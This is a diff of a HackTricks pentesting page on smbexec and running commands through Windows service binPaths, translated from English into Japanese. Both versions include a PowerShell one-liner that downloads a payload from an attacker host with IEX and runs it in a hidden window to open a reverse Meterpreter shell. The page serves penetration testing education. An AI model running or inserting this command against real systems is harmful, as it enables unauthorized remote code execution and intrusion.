@@ -4,70 +4,68 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
-## How does it works
+## 動作原理
 
-**Smbexec works like Psexec.** In this example\*\*,\*\* **instead** of pointing the "_binpath_" to a malicious executable inside the victim, we are going to **point it** to **cmd.exe or powershell.exe** and one of they will download and execute the backdoor.
+**SmbexecはPsexecのように動作します。** この例では、被害者の内部に悪意のある実行可能ファイルを指定する代わりに、**cmd.exeまたはpowershell.exe**を指定し、そのいずれかがバックドアをダウンロードして実行します。
 
 ## **SMBExec**
 
-Let's see what happens when smbexec runs by looking at it from the attackers and target's side:
+攻撃者とターゲットの側から見たときに、smbexecが実行されると何が起こるかを見てみましょう：
 
 ![](../../.gitbook/assets/smbexec\_prompt.png)
 
-So we know it creates a service "BTOBTO". But that service isn't present on the target machine when we do an `sc query`. The system logs reveal a clue to what happened:
+したがって、私たちは「BTOBTO」というサービスが作成されることを知っています。しかし、`sc query`を実行したときにそのサービスはターゲットマシンに存在しません。システムログには何が起こったかの手がかりがあります：
 
 ![](../../.gitbook/assets/smbexec\_service.png)
 
-The Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe). It echoes the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Back on Kali, the Python script then pulls the output file via SMB and displays the contents in our "pseudo-shell". For every command we type into our "shell", a new service is created and the process is repeated. This is why it doesn't need to drop a binary, it just executes each desired command as a new service. Definitely more stealthy, but as we saw, an event log is created for every command executed. Still a very clever way to get a non-interactive "shell"!
+サービスファイル名には、実行するコマンド文字列が含まれています（%COMSPEC%はcmd.exeの絶対パスを指します）。コマンドをバッチファイルにエコーし、stdoutとstderrを一時ファイルにリダイレクトし、バッチファイルを実行して削除します。Kaliに戻ると、PythonスクリプトがSMB経由で出力ファイルを取得し、内容を「疑似シェル」に表示します。私たちの「シェル」に入力するたびに、新しいサービスが作成され、プロセスが繰り返されます。これは、バイナリをドロップする必要がないため、各所望のコマンドを新しいサービスとして実行するだけです。確かによりステルス性が高いですが、実行されたコマンドごとにイベントログが作成されることに注意してください。非対話型の「シェル」を取得する非常に賢い方法です！
 
-## Manual SMBExec
+## 手動SMBExec
 
-**Or executing commands via services**
+**またはサービスを介してコマンドを実行する**
 
-As smbexec demonstrated, it's possible to execute commands directly from service binPaths instead of needing a binary. This can be a useful trick to keep in your back pocket if you need to just execute one arbitrary command on a target Windows machine. As a quick example, let's get a Meterpreter shell using a remote service _without_ a binary.
+smbexecが示したように、バイナリが必要なく、サービスのbinPathから直接コマンドを実行することができます。これは、ターゲットのWindowsマシンで単に任意のコマンドを実行する必要がある場合に便利なトリックです。簡単な例として、バイナリのないリモートサービスを使用してMeterpreterシェルを取得しましょう。
 
-We'll use Metasploit's `web_delivery` module and choose a PowerShell target with a reverse Meterpreter payload. The listener is set up and it tells us the command to execute on the target machine:
-
+Metasploitの`web_delivery`モジュールを使用し、逆向きのMeterpreterペイロードを持つPowerShellターゲットを選択します。リスナーが設定され、ターゲットマシンで実行するコマンドが表示されます：
 ```
-powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');  
+powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
 ```
-
-From our Windows attack box, we create a remote service ("metpsh") and set the binPath to execute cmd.exe with our payload:
+Windowsの攻撃ボックスから、リモートサービス（"metpsh"）を作成し、binPathを使用してペイロードを実行するためにcmd.exeを設定します。
 
 ![](../../.gitbook/assets/sc\_psh\_create.png)
 
-And then start it:
+そして、それを起動します。
 
 ![](../../.gitbook/assets/sc\_psh\_start.png)
 
-It errors out because our service doesn't respond, but if we look at our Metasploit listener we see that the callback was made and the payload executed.
+サービスが応答しないためエラーが発生しますが、Metasploitのリスナーを確認すると、コールバックが行われ、ペイロードが実行されたことがわかります。
 
-All the info was extracted from here: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+すべての情報はここから抽出されました：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksのリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudのリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
